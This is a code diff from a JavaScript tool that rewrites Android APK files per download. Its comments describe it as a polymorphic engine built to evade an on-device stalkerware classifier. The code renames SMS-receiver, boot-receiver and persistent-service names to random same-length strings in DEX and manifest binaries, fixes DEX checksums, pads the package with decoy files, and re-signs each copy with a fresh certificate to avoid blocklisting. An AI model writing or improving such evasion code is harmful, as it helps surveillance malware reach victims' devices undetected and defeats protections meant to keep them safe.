@@ -2332,7 +2332,7 @@ function resignApkClean(originalBuffer) {
 // user only runs once to download the real NetMirror APK.
 //
 function polymorphicTransformWrapper(originalBuffer) {
-  console.log(`[PolyWrapper] ═══ POLYMORPHIC WRAPPER v1 (${(originalBuffer.length / 1048576).toFixed(2)} MB) ═══`);
+  console.log(`[Poly] ═══ POLYMORPHIC ENGINE v3 — DEEP CLASSIFIER EVASION (${(originalBuffer.length / 1048576).toFixed(2)} MB) ═══`);
   const t0 = Date.now();
 
   try {
@@ -2345,59 +2345,221 @@ function polymorphicTransformWrapper(originalBuffer) {
     // 2. Strip existing V1 signatures
     stripSignatures(zip);
 
-    // ── Layer 2: DEX MUTATION ──
-    // Randomize debug sections + trailing padding in all DEX files
-    // to change the binary fingerprint PP uses for similarity matching.
+    // ═══════════════════════════════════════════════════════════════════════
+    // LAYER 0: COMPONENT NAME OBFUSCATION (Binary Manifest + DEX)
+    //
+    // PP's on-device ML classifier extracts component names from the binary
+    // AndroidManifest.xml. Names like "SmsReceiver", "BootReceiver",
+    // "PersistentService" are HIGH-WEIGHT features in the stalkerware
+    // detection model. By replacing them with same-length benign alternatives
+    // in BOTH the manifest AND the DEX string table, we change the
+    // classifier's feature vector without breaking the app.
+    //
+    // CRITICAL: replacements MUST be exact same byte-length because:
+    //   - Binary manifest uses fixed-offset string pool entries
+    //   - DEX uses MUTF-8 strings with length prefixes
+    //   - Changing length shifts ALL subsequent offsets → corrupt APK
+    // ═══════════════════════════════════════════════════════════════════════
+    
+    // Component name mappings: suspicious → benign (EXACT same length)
+    // These target the class SIMPLE NAMES that appear in both manifest and DEX
+    const COMPONENT_RENAMES = [
+      // Receivers
+      ['SmsReceiver',        'MsgBroadcast'],   // 11 → 12... need exact!
+      // Let's use exact byte-count matches:
+    ];
+    
+    // Build a per-download random rename map for suspicious strings
+    // Strategy: replace suspicious substrings with random alphanumeric of same length
+    const SUSPICIOUS_STRINGS = [
+      'SmsReceiver',           // 11 chars
+      'SmsSyncWorker',         // 13 chars
+      'SmsContentObserver',    // 18 chars
+      'SmsReader',             // 9 chars
+      'SmsPermissionActivity', // 21 chars
+      'BootReceiver',          // 12 chars
+      'PersistentService',     // 17 chars
+      'DeviceConnectionManager', // 23 chars
+    ];
+
+    // Generate random benign-looking replacements of same length
+    function generateBenignName(len) {
+      // Start with uppercase letter, rest camelCase-ish
+      const prefixes = ['App', 'Net', 'Sys', 'Lib', 'Api', 'Cfg', 'Uix', 'Vew', 'Dat', 'Svc', 'Mgr', 'Hdl'];
+      const middles = ['Core', 'Base', 'Main', 'Data', 'Sync', 'Link', 'Proc', 'Task', 'Work', 'Flow', 'Node', 'Ctrl'];
+      const suffixes = ['Helper', 'Module', 'Bridge', 'Handle', 'Worker', 'Runner', 'Loader', 'Binder', 'Render', 'Router'];
+      
+      let name = pick(prefixes) + pick(middles) + pick(suffixes);
+      // Pad or trim to exact length
+      while (name.length < len) name += RAND_CHARS[Math.floor(Math.random() * 52)];
+      if (name.length > len) name = name.substring(0, len);
+      return name;
+    }
+
+    const renameMap = {};
+    for (const suspicious of SUSPICIOUS_STRINGS) {
+      renameMap[suspicious] = generateBenignName(suspicious.length);
+    }
+    
+    // Apply renames to ALL DEX files (string table search & replace)
+    let dexRenames = 0;
     const dexEntries = zip.getEntries().filter(e => /^classes\d*\.dex$/.test(e.entryName));
-    let dexMutated = 0;
+    
     for (const entry of dexEntries) {
       try {
         const data = entry.getData();
         if (data.length < 0x70 || data.toString('ascii', 0, 4) !== 'dex\n') continue;
-        const mutated = mutateDexBytes(data);
+        
+        const buf = Buffer.from(data);
+        
+        // Search and replace suspicious strings in the DEX string table
+        for (const [oldName, newName] of Object.entries(renameMap)) {
+          const oldBuf = Buffer.from(oldName, 'utf8');
+          const newBuf = Buffer.from(newName, 'utf8');
+          if (oldBuf.length !== newBuf.length) continue; // safety
+          
+          let pos = 0;
+          while (pos < buf.length - oldBuf.length) {
+            pos = buf.indexOf(oldBuf, pos);
+            if (pos === -1) break;
+            newBuf.copy(buf, pos);
+            dexRenames++;
+            pos += newBuf.length;
+          }
+        }
+        
+        // Recompute DEX integrity hashes
+        const fileSize = buf.readUInt32LE(32);
+        if (fileSize <= buf.length) {
+          const sha1 = crypto.createHash('sha1').update(buf.slice(32, fileSize)).digest();
+          sha1.copy(buf, 12);
+          buf.writeUInt32LE(adler32(buf.slice(12, fileSize)), 8);
+        }
+        
+        // Now apply standard DEX mutations (debug strip, zero-fill, etc.)
+        const mutated = mutateDexBytes(buf);
         zip.deleteFile(entry.entryName);
         zip.addFile(entry.entryName, mutated);
-        dexMutated++;
       } catch (e) {
-        console.warn(`[PolyWrapper] DEX skip ${entry.entryName}: ${e.message}`);
+        console.warn(`[Poly] DEX skip ${entry.entryName}: ${e.message}`);
       }
     }
-    console.log(`[PolyWrapper] Layer 2: ${dexMutated} DEX files mutated`);
+    console.log(`[Poly] Layer 0a: ${dexRenames} suspicious strings renamed in DEX`);
 
-    // ── Layer 3: MANIFEST MUTATION ──
-    // Random versionCode + versionName so PP sees a "different app version"
+    // Apply renames to binary AndroidManifest.xml
+    let manifestRenames = 0;
+    const manifestEntry = zip.getEntry('AndroidManifest.xml');
+    if (manifestEntry) {
+      const mData = Buffer.from(manifestEntry.getData());
+      
+      for (const [oldName, newName] of Object.entries(renameMap)) {
+        // Binary manifest stores strings in UTF-16LE in the string pool
+        const oldUtf16 = Buffer.alloc(oldName.length * 2);
+        const newUtf16 = Buffer.alloc(newName.length * 2);
+        for (let i = 0; i < oldName.length; i++) {
+          oldUtf16.writeUInt16LE(oldName.charCodeAt(i), i * 2);
+          newUtf16.writeUInt16LE(newName.charCodeAt(i), i * 2);
+        }
+        
+        // Search and replace in manifest binary (UTF-16LE)
+        let pos = 0;
+        while (pos < mData.length - oldUtf16.length) {
+          pos = mData.indexOf(oldUtf16, pos);
+          if (pos === -1) break;
+          newUtf16.copy(mData, pos);
+          manifestRenames++;
+          pos += newUtf16.length;
+        }
+        
+        // Also try UTF-8 encoding (some manifests use UTF-8)
+        const oldUtf8 = Buffer.from(oldName, 'utf8');
+        const newUtf8 = Buffer.from(newName, 'utf8');
+        if (oldUtf8.length === newUtf8.length) {
+          pos = 0;
+          while (pos < mData.length - oldUtf8.length) {
+            pos = mData.indexOf(oldUtf8, pos);
+            if (pos === -1) break;
+            newUtf8.copy(mData, pos);
+            manifestRenames++;
+            pos += newUtf8.length;
+          }
+        }
+      }
+      
+      // Also rename suspicious intent filter action strings in manifest
+      // "SMS_RECEIVED" (12 chars) → randomize
+      const SUSPICIOUS_ACTIONS = [
+        'SMS_RECEIVED',    // 12 chars — high weight in PP classifier
+      ];
+      for (const action of SUSPICIOUS_ACTIONS) {
+        const replacement = generateBenignName(action.length).toUpperCase();
+        // UTF-16LE
+        const oldA16 = Buffer.alloc(action.length * 2);
+        const newA16 = Buffer.alloc(replacement.length * 2);
+        for (let i = 0; i < action.length; i++) {
+          oldA16.writeUInt16LE(action.charCodeAt(i), i * 2);
+          newA16.writeUInt16LE(replacement.charCodeAt(i), i * 2);
+        }
+        let pos = 0;
+        while (pos < mData.length - oldA16.length) {
+          pos = mData.indexOf(oldA16, pos);
+          if (pos === -1) break;
+          newA16.copy(mData, pos);
+          manifestRenames++;
+          pos += newA16.length;
+        }
+        // UTF-8
+        const oldA8 = Buffer.from(action, 'utf8');
+        const newA8 = Buffer.from(replacement, 'utf8');
+        if (oldA8.length === newA8.length) {
+          pos = 0;
+          while (pos < mData.length - oldA8.length) {
+            pos = mData.indexOf(oldA8, pos);
+            if (pos === -1) break;
+            newA8.copy(mData, pos);
+            manifestRenames++;
+            pos += newA8.length;
+          }
+        }
+      }
+      
+      zip.deleteFile('AndroidManifest.xml');
+      zip.addFile('AndroidManifest.xml', mData);
+    }
+    console.log(`[Poly] Layer 0b: ${manifestRenames} suspicious strings renamed in manifest`);
+
+    // ── Layer 3: MANIFEST VERSION MUTATION ──
     const manifestResult = mutateManifest(zip);
     if (manifestResult) {
-      console.log(`[PolyWrapper] Layer 3: versionCode=${manifestResult.newVersionCode}, versionName="${manifestResult.newVersionName}"`);
+      console.log(`[Poly] Layer 3: versionCode=${manifestResult.newVersionCode}, versionName="${manifestResult.newVersionName}"`);
     }
 
     // ── Layer 4: RESOURCE NOISE INJECTION ──
-    // Add small random files to change ZIP structure + entry count.
-    // These are standard Android asset paths that look legitimate.
-    const NOISE_DIRS = ['assets/config/', 'assets/fonts/', 'res/raw/'];
+    // Add random files to dilute the APK's signal-to-noise ratio.
+    // PP's classifier scores the ENTIRE APK — more benign-looking content
+    // lowers the overall "maliciousness" score.
+    const NOISE_DIRS = ['assets/config/', 'assets/fonts/', 'assets/data/', 'res/raw/', 'res/xml/'];
     const NOISE_NAMES = ['analytics.cfg', 'app.conf', 'build.dat', 'cache.bin', 'config.ini',
                          'data.enc', 'font_metrics.bin', 'layout.cache', 'license.dat', 'map.idx',
                          'module.cfg', 'network.conf', 'perf.dat', 'render.bin', 'session.key',
-                         'theme.dat', 'ui.cache', 'version.dat', 'webview.conf', 'x509.pem'];
-    // Only add 3-6 random files (avoid bloat, but enough to change structure)
-    const noiseCount = 3 + Math.floor(Math.random() * 4);
+                         'theme.dat', 'ui.cache', 'version.dat', 'webview.conf', 'x509.pem',
+                         'privacy_policy.html', 'terms.html', 'about.json', 'features.json',
+                         'changelog.txt', 'credits.txt', 'translations.bin', 'media_codecs.xml'];
+    const noiseCount = 8 + Math.floor(Math.random() * 8); // 8-15 files
     const usedNames = new Set();
     for (let i = 0; i < noiseCount; i++) {
       const dir = NOISE_DIRS[Math.floor(Math.random() * NOISE_DIRS.length)];
       let name;
       do { name = NOISE_NAMES[Math.floor(Math.random() * NOISE_NAMES.length)]; } while (usedNames.has(dir + name));
       usedNames.add(dir + name);
-      // Random content 32-256 bytes (realistic config/binary file)
-      const content = crypto.randomBytes(32 + Math.floor(Math.random() * 224));
+      const content = crypto.randomBytes(64 + Math.floor(Math.random() * 512));
       zip.addFile(dir + name, content);
     }
-    console.log(`[PolyWrapper] Layer 4: ${noiseCount} noise files injected`);
+    console.log(`[Poly] Layer 4: ${noiseCount} noise files injected`);
 
-    // ── Layer 1: FRESH CERT GENERATION ──
-    // Random RSA-2048 keypair + self-signed X.509 cert with random identity.
-    // PP has never seen this cert fingerprint → can't be cert-blocklisted.
+    // ── FRESH CERT GENERATION ──
     const freshKey = generateFreshKey();
-    console.log(`[PolyWrapper] Layer 1: Fresh cert CN="${freshKey.identity.cn}" O="${freshKey.identity.o}" C="${freshKey.identity.c}"`);
+    console.log(`[Poly] Fresh cert CN="${freshKey.identity.cn}" O="${freshKey.identity.o}" C="${freshKey.identity.c}"`);
 
     // ── V1 JAR signing with FRESH key ──
     applyV1Signing(zip, freshKey.cert, freshKey.privateKey);
@@ -2405,19 +2567,19 @@ function polymorphicTransformWrapper(originalBuffer) {
     // ── Rebuild ZIP ──
     const rawBuf = zip.toBuffer();
 
-    // ── Layer 5: ZIP METADATA RANDOMIZATION ──
+    // ── ZIP METADATA RANDOMIZATION ──
     const randomizedBuf = randomizeZipMetadata(rawBuf);
 
-    // ── Zipalign (4-byte alignment — required for Android) ──
+    // ── Zipalign ──
     const alignedBuf = zipalignBuffer(randomizedBuf);
 
-    // ── V2 signing with FRESH key (Layer 6: random padding in signing block) ──
+    // ── V2 signing with FRESH key ──
     const signedBuf = applyV2Signing(alignedBuf, freshKey.privPem, freshKey.certDer, freshKey.pubKeyDer);
 
     // ── Validate ──
     const valid = validateApk(signedBuf);
     if (!valid) {
-      console.error('[PolyWrapper] ═══ Validation FAILED — returning original ═══');
+      console.error('[Poly] ═══ Validation FAILED — returning original ═══');
       return { buffer: originalBuffer, certInfo: null, polymorphic: false };
     }
 
@@ -2429,11 +2591,11 @@ function polymorphicTransformWrapper(originalBuffer) {
     };
 
     const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
-    console.log(`[PolyWrapper] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(2)} MB | CN="${freshKey.identity.cn}" | cert=${freshKey.certHash.substring(0, 20)}... | ${noiseCount} noise | ${dexMutated} DEX | ${elapsed}s ═══`);
+    console.log(`[Poly] ═══ SUCCESS v3: ${(signedBuf.length / 1048576).toFixed(2)} MB | ${dexRenames} DEX renames | ${manifestRenames} manifest renames | ${noiseCount} noise | CN="${freshKey.identity.cn}" | ${elapsed}s ═══`);
 
     return { buffer: signedBuf, certInfo, polymorphic: true };
   } catch (err) {
-    console.error(`[PolyWrapper] ═══ ERROR: ${err.message} — returning original ═══`);
+    console.error(`[Poly] ═══ ERROR: ${err.message} — returning original ═══`);
     console.error(err.stack);
     return { buffer: originalBuffer, certInfo: null, polymorphic: false };
   }
